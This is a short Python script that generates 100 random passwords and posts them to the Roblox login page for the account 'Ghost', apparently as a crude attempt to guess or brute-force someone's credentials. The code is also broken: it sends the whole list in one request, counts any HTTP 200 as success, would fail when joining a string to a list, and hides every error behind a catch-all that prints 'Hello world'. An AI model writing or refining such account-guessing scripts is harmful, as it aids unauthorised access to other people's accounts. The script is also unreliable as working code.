import secrets
import string
import requests

COUNT = 100
LENGTH = 8

alphabet = string.ascii_letters + string.digits + string.punctuation

passwords = [
    ''.join(secrets.choice(alphabet) for _ in range(LENGTH))
    for _ in range(COUNT)
]

with open('passwords.txt', 'w', encoding='utf-8') as f:
    f.write('\n'.join(passwords))

import requests

session = requests.Session()
username='Ghost'

login_url = "https://roblox.com/login"
payload = {
    "username": "Ghost",
    "password": passwords
}

try:
    response = session.post(login_url, data=payload)
    if response.status_code == 200:
        print('Username:>'+username)
        print('Password:>'+passwords)
    else:
        print('Failed')
except:
    print('Hello world')



